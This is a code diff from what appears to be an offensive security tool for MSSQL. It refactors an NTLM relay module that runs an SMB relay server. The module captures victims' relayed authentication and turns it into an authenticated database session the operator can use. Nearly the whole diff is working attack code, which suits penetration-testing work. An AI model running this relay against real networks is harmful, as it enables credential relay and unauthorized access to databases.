@@ -17,56 +17,17 @@ from mssqlclientng.src.services.database import DatabaseContext
 from mssqlclientng.src.models.server import Server
 
 
-class CustomMSSQLAttack(ProtocolAttack):
-    """
-    Custom MSSQL attack that captures authenticated clients for DatabaseContext.
-    """
-
-    PLUGIN_NAMES = ["MSSQL"]
-    captured_clients = []
-
-    def __init__(self, config, MSSQLclient, username, target=None, relay_client=None):
-        ProtocolAttack.__init__(
-            self, config, MSSQLclient, username, target, relay_client
-        )
-
-    def run(self):
-        """Capture authenticated client after successful relay."""
-        logger.success(
-            f"Successfully relayed authentication for {self.domain}\\{self.username}"
-        )
-        logger.info(f"Target: {self.target.hostname if self.target else 'Unknown'}")
-
-        connection_info = {
-            "client": self.client,
-            "username": self.username,
-            "domain": self.domain,
-            "target": self.target,
-        }
-
-        CustomMSSQLAttack.captured_clients.append(connection_info)
-        logger.success(
-            f"Captured authenticated MSSQL client (total: {len(CustomMSSQLAttack.captured_clients)})"
-        )
-        logger.info("Attack completed - connection is ready for use")
-        return True
-
-    @classmethod
-    def get_latest_client(cls):
-        """Get the most recently captured authenticated client."""
-        return cls.captured_clients[-1] if cls.captured_clients else None
-
-    @classmethod
-    def clear_clients(cls):
-        """Clear all captured clients."""
-        cls.captured_clients.clear()
-
-
 class RelayMSSQL:
+    """
+    NTLM Relay server for MSSQL authentication capture.
+    Manages relay servers and captured authenticated clients.
+    """
 
     def __init__(self, hostname: str):
         self.relay_servers = []
         self.threads = set()
+        self.captured_client = None  # Store single captured client
+        self.server_instance = None  # Will be set when waiting for connection
 
         # Only register MSSQL protocol client (avoid loading all protocols)
         minimal_protocol_clients = {"MSSQL": MSSQLRelayClient}
@@ -78,7 +39,35 @@ class RelayMSSQL:
         )
         self.relay_servers.append(SMBRelayServer)
 
-        # Register custom attack
+        # Create custom attack class that references this instance
+        self._register_attack()
+
+    def _register_attack(self):
+        """Register custom attack class that captures to this instance."""
+        relay_instance = self
+
+        class CustomMSSQLAttack(ProtocolAttack):
+            """Custom MSSQL attack bound to RelayMSSQL instance."""
+
+            PLUGIN_NAMES = ["MSSQL"]
+
+            def run(self):
+                """Capture authenticated client after successful relay."""
+                logger.success(
+                    f"Successfully relayed authentication for {self.domain}\\{self.username}"
+                )
+                logger.info(
+                    f"Target: {self.target.hostname if self.target else 'Unknown'}"
+                )
+
+                # Store in parent RelayMSSQL instance
+                relay_instance.captured_client = {
+                    "client": self.client,
+                    "username": self.username,
+                    "domain": self.domain,
+                }
+                return True
+
         PROTOCOL_ATTACKS["MSSQL"] = CustomMSSQLAttack
         logger.debug("Registered CustomMSSQLAttack for MSSQL protocol")
 
@@ -117,58 +106,51 @@ class RelayMSSQL:
         return c
 
     def wait_for_connection(
-        self, timeout: int = 60, database: str = "master"
+        self, server_instance: Server, timeout: int = 60
     ) -> Optional[DatabaseContext]:
         """
         Wait for a relayed connection and create a DatabaseContext from it.
 
         Args:
+            server_instance: Server model with hostname, port, database already configured
             timeout: Maximum seconds to wait for a connection
-            database: Database to connect to
 
         Returns:
             DatabaseContext instance or None if no connection captured
         """
+        self.server_instance = server_instance
         logger.info(f"Waiting up to {timeout} seconds for relayed connection")
 
         start_time = time.time()
         while time.time() - start_time < timeout:
-            client_info = CustomMSSQLAttack.get_latest_client()
-
-            if client_info:
+            if self.captured_client:
                 logger.success("Relayed connection captured!")
-                return self._create_database_context(client_info, database)
+
+                # Extract authenticated client and user info
+                mssql_client = self.captured_client["client"]
+                username = self.captured_client["username"]
+                domain = self.captured_client["domain"]
+
+                # Create DatabaseContext using the authenticated client
+                logger.trace(
+                    f"Creating DatabaseContext for {domain}\\{username}@{server_instance.hostname}"
+                )
+                db_context = DatabaseContext(
+                    server=server_instance, mssql_instance=mssql_client
+                )
+
+                # Update server with relayed user info
+                db_context.server.mapped_user = (
+                    f"{domain}\\{username}" if domain else username
+                )
+                logger.trace("DatabaseContext created successfully")
+
+                return db_context
 
             time.sleep(0.5)
 
         logger.warning(f"No relayed connection received within {timeout} seconds")
         return None
-
-    def _create_database_context(
-        self, client_info: dict, database: str
-    ) -> DatabaseContext:
-        """Convert captured relay client into DatabaseContext."""
-        mssql_client = client_info["client"]
-        username = client_info["username"]
-        domain = client_info["domain"]
-        target = client_info["target"]
-
-        hostname = target.hostname if target else "Unknown"
-        port = (
-            target.port if target and hasattr(target, "port") and target.port else 1433
-        )
-
-        server = Server(
-            hostname=hostname, port=port, database=database, impersonation_user=None
-        )
-
-        logger.info(f"Creating DatabaseContext for {domain}\\{username}@{hostname}")
-        db_context = DatabaseContext(server=server, mssql_instance=mssql_client)
-
-        db_context.server.mapped_user = f"{domain}\\{username}" if domain else username
-        logger.success("DatabaseContext created successfully")
-
-        return db_context
 
     def stop_servers(self):
         """Stop all relay servers."""
